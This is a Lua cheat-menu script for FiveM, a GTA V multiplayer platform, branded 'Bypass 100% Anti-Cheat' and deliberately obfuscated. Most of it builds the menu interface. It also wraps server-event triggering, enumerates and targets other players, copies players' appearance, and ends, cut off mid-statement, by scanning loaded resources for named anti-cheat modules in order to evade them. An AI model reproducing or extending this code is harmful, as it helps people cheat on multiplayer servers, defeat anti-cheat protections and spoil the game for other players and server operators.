--Bypass 100% Anti-Cheat Powered by : Pryor & Mesquita--
local felipebypassedmesquita = {}


local titolo = "Pryor~r~  MENU"
local pisellone = PlayerId(PlayerIdx)
local pisello = GetPlayerName(pisellone)
local showblip = Pryorbypessed2
local showsprite = Pryorbypessed2
local nameabove = Pryorbypessed3
local esp = Pryorbypessed3

felipebypassedmesquita.debug = Pryorbypessed2

local function RGB(frequency)
  local result = {}
  local curtime = GetGameTimer() / 800
  result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
  result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
  result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

  return result
end

local menus = {}
local keys = {up = 246, down = 74, left = 174, right = 175, select = 176, back = 177}
local optionCount = 1
local currentKey = Pryorbypessed
local currentMenu = Pryorbypessed
local menuWidth = 0.21
local titleHeight = 0.05
local titleYOffset = 0.01
local titleScale = 0.8
local buttonHeight = 0.035
local buttonFont = 4
local buttonScale = 0.420
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.005
local descHeight = 0.035
local descFont = 1
local descXOffset = 0.003
local descScale = 0.370
local bytexd = "❤Use com moderação❤... Pega nada ADM!!"
local MenuWider = Pryorbypessed

local Pryorbypessed = Nil
local Pryorbypessed1 = TriggerServerEvent
local Pryorbypessed2 = false
local Pryorbypessed3 = true
local Pryorbypessed4 = DisableControlAction

noclipKeybind = 1

local function debugPrint(text)
  if felipebypassedmesquita.debug then
    Citizen.Trace("[felipebypassedmesquita] " .. tostring(text))
  end
end

local function setMenuProperty(id, property, value)
  if id and menus[id] then
    menus[id][property] = value
    debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
  end
end

local function isMenuVisible(id)
  if id and menus[id] then
    return menus[id].visible
  else
    return Pryorbypessed2
  end
end

local function setMenuVisible(id, visible, holdCurrent)
  if id and menus[id] then
    setMenuProperty(id, "visible", visible)

    if not holdCurrent and menus[id] then
      setMenuProperty(id, "currentOption", 1)
    end

    if visible then
      if id ~= currentMenu and isMenuVisible(currentMenu) then
        setMenuVisible(currentMenu, Pryorbypessed2)
      end

      currentMenu = id
    end
  end
end
	

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
  SetTextColour(color.r, color.g, color.b, color.a)
  SetTextFont(font)
  SetTextScale(scale, scale)

  if shadow then
    SetTextDropShadow(2, 2, 0, 0, 0)
  end

  if menus[currentMenu] then
    if center then
      SetTextCentre(center)
    elseif alignRight then
      SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
      SetTextRightJustify(Pryorbypessed3)
    end
  end
  SetTextEntry("STRING")
  AddTextComponentString(text)
  DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
  DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight / 2

    if menus[currentMenu].titleBackgroundSprite then
      DrawSprite(
      menus[currentMenu].titleBackgroundSprite.dict,
      menus[currentMenu].titleBackgroundSprite.name,
      x,
      y,
      menuWidth,
      titleHeight,
      0.,
      255,
      255,
      255,
      255
      )
    else
      drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
    end

    drawText(
    menus[currentMenu].title,
    x,
    y - titleHeight / 2 + titleYOffset,
    menus[currentMenu].titleFont,
    menus[currentMenu].titleColor,
    titleScale,
    Pryorbypessed3
    )
  end
end

local function drawSubTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

    local rgb = RGB(0.5)

    local subTitleColor = {
      r=rgb.r,
      g=rgb.g,
      b=rgb.b,
      a = 255
    }

    drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
    drawText(
    menus[currentMenu].subTitle,
    menus[currentMenu].x + buttonTextXOffset,
    y - buttonHeight / 2 + buttonTextYOffset,
    buttonFont,
    subTitleColor,
    buttonScale,
    Pryorbypessed2
    )

    if optionCount > menus[currentMenu].maxOptionCount then
      drawText(
      tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
      menus[currentMenu].x + menuWidth,
      y - buttonHeight / 2 + buttonTextYOffset,
      buttonFont,
      subTitleColor,
      buttonScale,
      Pryorbypessed2,
      Pryorbypessed2,
      Pryorbypessed3
      )
    end
  end
end

local function drawDescription(desc, descYOffset, ky)
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + descHeight / 2
    local ra = RGB(5.0)
    local descriptionColor = {
      r = ra.r,
      g = ra.b,
      b = 255,
      a = 255
    }

    drawRect(x, y + ky, menuWidth, descHeight, descriptionBackgroundColor)

    drawText(
    desc,
    menus[currentMenu].x + descXOffset,
    y - descHeight / 2 + descYOffset + 0.005,
    descFont,
    descriptionColor,
    descScale,
    Pryorbypessed2
    )
  end
end

local function drawButton(text, subText)
  local x = menus[currentMenu].x + menuWidth / 2
  local multiplier = Pryorbypessed

  if
  menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
  optionCount <= menus[currentMenu].maxOptionCount
  then
    multiplier = optionCount
  elseif
    optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
    optionCount <= menus[currentMenu].currentOption
    then
      multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
      local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
      local backgroundColor = Pryorbypessed
      local textColor = Pryorbypessed
      local subTextColor = Pryorbypessed
      local shadow = Pryorbypessed2

      if menus[currentMenu].currentOption == optionCount then
        backgroundColor = menus[currentMenu].menuFocusBackgroundColor
        textColor = menus[currentMenu].menuFocusTextColor
        subTextColor = menus[currentMenu].menuFocusTextColor
      else
        backgroundColor = menus[currentMenu].menuBackgroundColor
        textColor = menus[currentMenu].menuTextColor
        subTextColor = menus[currentMenu].menuSubTextColor
        shadow = Pryorbypessed3
      end

      drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
      drawText(
      text,
      menus[currentMenu].x + buttonTextXOffset,
      y - (buttonHeight / 2) + buttonTextYOffset,
      buttonFont,
      textColor,
      buttonScale,
      Pryorbypessed2,
      shadow
      )

      if subText then
        drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset,
        y - buttonHeight / 2 + buttonTextYOffset,
        buttonFont,
        subTextColor,
        buttonScale,
        Pryorbypessed2,
        shadow,
        Pryorbypessed3
        )
      end
    end
  end


  function felipebypassedmesquita.CreateMenu(id, title)
    -- Default settings
    menus[id] = {}
    menus[id].title = titolo
    menus[id].subTitle = "🥂  Eae seu Macaco, Use com Sabedoria! :))  🥂"


    menus[id].visible = Pryorbypessed2

    menus[id].previousMenu = Pryorbypessed

    menus[id].aboutToBeClosed = Pryorbypessed2

menus[id].x = 0.65
menus[id].y = 0.15

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 15
    menus[id].titleFont = 1
    Citizen.CreateThread(
    function()
      while Pryorbypessed3 do
        Citizen.Wait(0)
        local ra = RGB(2.0)
        menus[id].titleColor = {r = ra.r, g = ra.g, b = ra.b, a = 255}
      end
      end)
      Citizen.CreateThread(
      function()
        while Pryorbypessed3 do
          Citizen.Wait(0)
          local ra = RGB(1.0)
          menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100}
        end
        end)
        menus[id].titleBackgroundSprite = Pryorbypessed
        menus[id].titleBackgroundColor = {r = 1, g = 1, b = 1, a = 160}
        menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
        menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 130}

        menus[id].subTitleBackgroundColor = {r = 255, g = 255, b = 255, a = 160}

        descriptionBackgroundColor =
        {
          r = menus[id].menuBackgroundColor.r,
          g = menus[id].menuBackgroundColor.g,
          b = menus[id].menuBackgroundColor.b,
          a = 125
        }
        menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

        debugPrint(tostring(id) .. " menu created")
      end

      function felipebypassedmesquita.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
          felipebypassedmesquita.CreateMenu(id, menus[parent].title)

          if subTitle then
            setMenuProperty(id, "subTitle", (subTitle))
          else
            setMenuProperty(id, "subTitle", (menus[parent].subTitle))
          end

          setMenuProperty(id, "previousMenu", parent)

          setMenuProperty(id, "x", menus[parent].x)
          setMenuProperty(id, "y", menus[parent].y)
          setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
          setMenuProperty(id, "titleFont", menus[parent].titleFont)
          setMenuProperty(id, "titleColor", menus[parent].titleColor)
          setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
          setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
          setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
          setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
          setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
          setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
          setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
          setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
        else
          debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
        end
      end

      function felipebypassedmesquita.CurrentMenu()
        return currentMenu
      end

      function felipebypassedmesquita.OpenMenu(id)
        if id and menus[id] then
          PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)
          setMenuVisible(id, Pryorbypessed3)

          if menus[id].titleBackgroundSprite then
            RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, Pryorbypessed2)
            while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
              Citizen.Wait(0)
            end
          end

          debugPrint(tostring(id) .. " menu opened")
        else
          debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
        end
      end

      function felipebypassedmesquita.IsMenuOpened(id)
        return isMenuVisible(id)
      end

      function felipebypassedmesquita.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
          if isMenuVisible(id) then
            return Pryorbypessed3
          end
        end

        return Pryorbypessed2
      end

      function felipebypassedmesquita.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
          return menus[currentMenu].aboutToBeClosed
        else
          return Pryorbypessed2
        end
      end

      function felipebypassedmesquita.CloseMenu()
        if menus[currentMenu] then
          if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = Pryorbypessed2
            setMenuVisible(currentMenu, Pryorbypessed2)
            debugPrint(tostring(currentMenu) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)
            optionCount = 0
            currentMenu = Pryorbypessed
            currentKey = Pryorbypessed
          else
            menus[currentMenu].aboutToBeClosed = Pryorbypessed3
            debugPrint(tostring(currentMenu) .. " menu about to be closed")
          end
        end
      end

      function felipebypassedmesquita.button(text, subText)
        local buttonText = text
        if subText then
          buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
        end

        if menus[currentMenu] then
          optionCount = optionCount + 1

          local isCurrent = menus[currentMenu].currentOption == optionCount

          drawButton(text, subText)

          if isCurrent then
            if currentKey == keys.select then
              PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, Pryorbypessed3)
              debugPrint(buttonText .. " button pressed")
              return Pryorbypessed3
            elseif currentKey == keys.left or currentKey == keys.right then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)
            end
          end

          return Pryorbypessed2
        else
          debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

          return Pryorbypessed2
        end
      end

      function felipebypassedmesquita.MenuButton(text, id)
        if menus[id] then
          if felipebypassedmesquita.button(text) then
            setMenuVisible(currentMenu, Pryorbypessed2)
            setMenuVisible(id, Pryorbypessed3, Pryorbypessed3)

            return Pryorbypessed3
          end
        else
          debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
        end

        return Pryorbypessed2
      end

      function felipebypassedmesquita.CheckBox(text, bool, callback)
        local checked = "~r~OFF"
        if bool then
          checked = "~g~ON"
        end

        if felipebypassedmesquita.button(text, checked) then
          bool = not bool
          debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
          callback(bool)

          return Pryorbypessed3
        end

        return Pryorbypessed2
      end

      local function revO()
        MenuWider = 0
      end

      function felipebypassedmesquita.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if felipebypassedmesquita.button(text, selectedItem) then
          selectedIndex = currentIndex
          callback(currentIndex, selectedIndex)
          return Pryorbypessed3
        elseif isCurrent then
          if currentKey == keys.left then
            if currentIndex > 1 then
              currentIndex = currentIndex - 1
            else
              currentIndex = itemsCount
            end
          elseif currentKey == keys.right then
            if currentIndex < itemsCount then
              currentIndex = currentIndex + 1
            else
              currentIndex = 1
            end
          end
        else
          currentIndex = selectedIndex
        end

        callback(currentIndex, selectedIndex)
        return Pryorbypessed2
      end

      function TSE(a,b,c,d,e,f,g,h,i,m)
        Pryorbypessed1(a,b,c,d,e,f,g,h,i,m)
      end

      function felipebypassedmesquita.Display()
        if isMenuVisible(currentMenu) then
          if menus[currentMenu].aboutToBeClosed then
            felipebypassedmesquita.CloseMenu()
          else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = Pryorbypessed

            if IsDisabledControlJustPressed(0, keys.down) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)

              if menus[currentMenu].currentOption < optionCount then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
              else
                menus[currentMenu].currentOption = 1
              end
            elseif IsDisabledControlJustPressed(0, keys.up) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)

              if menus[currentMenu].currentOption > 1 then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
              else
                menus[currentMenu].currentOption = optionCount
              end
            elseif IsDisabledControlJustPressed(0, keys.left) then
              currentKey = keys.left
            elseif IsDisabledControlJustPressed(0, keys.right) then
              currentKey = keys.right
            elseif IsDisabledControlJustPressed(0, keys.select) then
              currentKey = keys.select
            elseif IsDisabledControlJustPressed(0, keys.back) then
              if menus[menus[currentMenu].previousMenu] then
                PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", Pryorbypessed3)
                setMenuVisible(menus[currentMenu].previousMenu, Pryorbypessed3)
              else
                felipebypassedmesquita.CloseMenu()
              end
            end

            optionCount = 0
          end
        end
      end

      function felipebypassedmesquita.SetMenuWidth(id, width)
        setMenuProperty(id, "width", width)
      end

      function felipebypassedmesquita.SetMenuX(id, x)
        setMenuProperty(id, "x", x)
      end

      function felipebypassedmesquita.SetMenuY(id, y)
        setMenuProperty(id, "y", y)
      end

      function felipebypassedmesquita.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, "maxOptionCount", count)
      end

      function felipebypassedmesquita.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
      end

      function felipebypassedmesquita.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
        )
      end

      function felipebypassedmesquita.SetTitleBackgroundSprite(id, textureDict, textureName)
        setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
      end

      function felipebypassedmesquita.SetSubTitle(id, text)
        setMenuProperty(id, "subTitle", (text))
      end


      function felipebypassedmesquita.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
        )
      end

      function felipebypassedmesquita.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
      end

      function felipebypassedmesquita.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
      end

      function felipebypassedmesquita.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
      end

      function felipebypassedmesquita.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
      end

      function Pryyyorbypass(TextEntry, ExampleText, MaxStringLength)
		AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
		DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end

      function EnumeratePickups()
        return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
      end

      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end

      function GetSeatPedIsIn(ped)
        if not IsPedInAnyVehicle(ped, Pryorbypessed2) then return
      else
        veh = GetVehiclePedIsIn(ped)
        for i=0, GetVehicleMaxNumberOfPassengers(veh) do
          if GetPedInVehicleSeat(veh) then return i end
        end
      end
    end

    function GetCamDirFromScreenCenter()
      local pos = GetGameplayCamCoord()
      local world = ScreenToWorld(0, 0)
      local ret = SubVectors(world, pos)
      return ret
    end

    function ScreenToWorld(screenCoord)
      local camRot = GetGameplayCamRot(2)
      local camPos = GetGameplayCamCoord()

      local vect2x = 0.0
      local vect2y = 0.0
      local vect21y = 0.0
      local vect21x = 0.0
      local direction = RotationToDirection(camRot)
      local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

      local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
      local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
      local radians = -(math.rad(camRot.y))

      vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
      vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

      local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
      if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
      end

      local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
      if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
      end
			
      if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
      end

      local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
      local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
      return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function WorldToScreenRel(worldCoords)
      local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
      if not check then
        return Pryorbypessed2
      end

      screenCoordsx = (x - 0.5) * 2.0
      screenCoordsy = (y - 0.5) * 2.0
      return Pryorbypessed3, screenCoordsx, screenCoordsy
    end

    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    local function GetCamDirection()
      local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
      local pitch = GetGameplayCamRelativePitch()

      local x = -math.sin(heading*math.pi/180.0)
      local y = math.cos(heading*math.pi/180.0)
      local z = math.sin(pitch*math.pi/180.0)

      local len = math.sqrt(x*x+y*y+z*z)
      if len ~= 0 then
        x = x/len
        y = y/len
        z = z/len
      end

      return x,y,z
    end

    local function getPlayerIds()
      local players = {}
      for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
          players[#players + 1] = i
        end
      end
      return players
    end
		
		function GetPlayers()
    local players = {}

    for i = 0, 255 do
        if NetworkIsPlayerActive(i) then
            table.insert(players, i)
        end
    end

    return players
end

function GetClosestPlayer(radius)
    local players = GetPlayers()
    local closestDistance = -1
    local closestPlayer = -1
    local ply = GetPlayerPed(-1)
    local plyCoords = GetEntityCoords(ply, 0)

    for index,value in ipairs(players) do
        local target = GetPlayerPed(value)
        if(target ~= ply) then
            local targetCoords = GetEntityCoords(GetPlayerPed(value), 0)
            local distance = GetDistanceBetweenCoords(targetCoords['x'], targetCoords['y'], targetCoords['z'], plyCoords['x'], plyCoords['y'], plyCoords['z'], Pryorbypessed3)
            if(closestDistance == -1 or closestDistance > distance) then
                closestPlayer = value
                closestDistance = distance
            end
        end
    end
	print("closest player is dist: " .. tostring(closestDistance))
	if closestDistance <= radius then
		return closestPlayer
	else
		return Pryorbypessed
	end
end
	local function RandomSkin(target)
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, Pryorbypessed2)
		SetPedRandomProps(ped)
	end

  local function GetResources()
    local resources = {}
    for i=0, GetNumResources() do
      resources[i] = GetResourceByFindIndex(i)
    end
    return resources
  end

  

	local function ClonePedlol(target)
		local ped = GetPlayerPed(target)
		local me = PlayerPedId()
		
		hat = GetPedPropIndex(ped, 0)
		hat_texture = GetPedPropTextureIndex(ped, 0)
		
		glasses = GetPedPropIndex(ped, 1)
		glasses_texture = GetPedPropTextureIndex(ped, 1)
		
		ear = GetPedPropIndex(ped, 2)
		ear_texture = GetPedPropTextureIndex(ped, 2)
		
		watch = GetPedPropIndex(ped, 6)
		watch_texture = GetPedPropTextureIndex(ped, 6)
		
		wrist = GetPedPropIndex(ped, 7)
		wrist_texture = GetPedPropTextureIndex(ped, 7)
		
		head_drawable = GetPedDrawableVariation(ped, 0)
		head_palette = GetPedPaletteVariation(ped, 0)
		head_texture = GetPedTextureVariation(ped, 0)
		
		beard_drawable = GetPedDrawableVariation(ped, 1)
		beard_palette = GetPedPaletteVariation(ped, 1)
		beard_texture = GetPedTextureVariation(ped, 1)
		
		hair_drawable = GetPedDrawableVariation(ped, 2)
		hair_palette = GetPedPaletteVariation(ped, 2)
		hair_texture = GetPedTextureVariation(ped, 2)
		
		torso_drawable = GetPedDrawableVariation(ped, 3)
		torso_palette = GetPedPaletteVariation(ped, 3)
		torso_texture = GetPedTextureVariation(ped, 3)
		
		legs_drawable = GetPedDrawableVariation(ped, 4)
		legs_palette = GetPedPaletteVariation(ped, 4)
		legs_texture = GetPedTextureVariation(ped, 4)
		
		hands_drawable = GetPedDrawableVariation(ped, 5)
		hands_palette = GetPedPaletteVariation(ped, 5)
		hands_texture = GetPedTextureVariation(ped, 5)
		
		foot_drawable = GetPedDrawableVariation(ped, 6)
		foot_palette = GetPedPaletteVariation(ped, 6)
		foot_texture = GetPedTextureVariation(ped, 6)
		
		acc1_drawable = GetPedDrawableVariation(ped, 7)
		acc1_palette = GetPedPaletteVariation(ped, 7)
		acc1_texture = GetPedTextureVariation(ped, 7)
		
		acc2_drawable = GetPedDrawableVariation(ped, 8)
		acc2_palette = GetPedPaletteVariation(ped, 8)
		acc2_texture = GetPedTextureVariation(ped, 8)
		
		acc3_drawable = GetPedDrawableVariation(ped, 9)
		acc3_palette = GetPedPaletteVariation(ped, 9)
		acc3_texture = GetPedTextureVariation(ped, 9)
		
		mask_drawable = GetPedDrawableVariation(ped, 10)
		mask_palette = GetPedPaletteVariation(ped, 10)
		mask_texture = GetPedTextureVariation(ped, 10)
		
		aux_drawable = GetPedDrawableVariation(ped, 11)
		aux_palette = GetPedPaletteVariation(ped, 11) 	
		aux_texture = GetPedTextureVariation(ped, 11)

		SetPedPropIndex(me, 0, hat, hat_texture, 1)
		SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
		SetPedPropIndex(me, 2, ear, ear_texture, 1)
		SetPedPropIndex(me, 6, watch, watch_texture, 1)
		SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
		
		SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
		SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
		SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
		SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
		SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
		SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
		SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
		SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
		SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
		SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
		SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
		SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
	end


    function DrawText3D(x, y, z, text, r, g, b)
      SetDrawOrigin(x, y, z, 0)
      SetTextFont(0)
      SetTextProportional(0)
      SetTextScale(0.0, 0.20)
      SetTextColour(r, g, b, 255)
      SetTextDropshadow(0, 0, 0, 0, 255)
      SetTextEdge(2, 0, 0, 0, 150)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      SetTextCentre(1)
      AddTextComponentString(text)
      DrawText(0.0, 0.0)
      ClearDrawOrigin()
    end

    function math.round(num, numDecimalPlaces)
      return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end

    local function RGB(frequency)
      local result = {}
      local curtime = GetGameTimer() / 1000

      result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
      result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
      result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

      return result
    end

    function notify(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(Pryorbypessed3, Pryorbypessed2)
    end

    function checkValidVehicleExtras()
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, Pryorbypessed2)
      local valid = {}

      for i=0,50,1 do
        if(DoesExtraExist(playerVeh, i))then
          local realModname = "Extra #"..tostring(i)
          local text = "OFF"
          if(IsVehicleExtraTurnedOn(playerVeh, i))then
            text = "ON"
          end
          local realSpawnname = "extra "..tostring(i)
          table.insert(valid, {
            menuName=realModName,
            data ={
              ["action"] = realSpawnName,
              ["state"] = text
            }
          })
        end
      end

      return valid
    end


    function DoesVehicleHaveExtras( veh )
      for i = 1, 30 do
        if ( DoesExtraExist( veh, i ) ) then
          return Pryorbypessed3
        end
      end

      return Pryorbypessed2
    end
	

    function checkValidVehicleMods(modID)
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, Pryorbypessed2)
      local valid = {}
      local modCount = GetNumVehicleMods(playerVeh,modID)
      if (modID == 48 and modCount == 0) then


        local modCount = GetVehicleLiveryCount(playerVeh)
        for i=1, modCount, 1 do
          local realIndex = i - 1
          local modName = GetLiveryName(playerVeh, realIndex)
          local realModName = GetLabelText(modName)
          local modid, realSpawnName = modID, realIndex

          valid[i] = {
            menuName=realModName,
            data = {
              ["modid"] = modid,
              ["realIndex"] = realSpawnName
            }
          }
        end
      end

      for i = 1, modCount, 1 do
        local realIndex = i - 1
        local modName = GetModTextLabel(playerVeh, modID, realIndex)
        local realModName = GetLabelText(modName)
        local modid, realSpawnName = modCount, realIndex


        valid[i] = {
          menuName=realModName,
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        }
      end


      if(modCount > 0)then
        local realIndex = -1
        local modid, realSpawnName = modID, realIndex
        table.insert(valid, 1, {
          menuName="Stock",
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        })
      end

      return valid
    end
    local protection = Pryorbypessed2
    Resources = GetResources()
    for i=0, #Resources do
      local detect = string.find(tostring(Resources[i]), "antilynxr6")
      local antishit = string.find(tostring(Resources[i]), "antilynxr5")
      print(Resources[i])
      if antishit ~= Pryorbypessed then
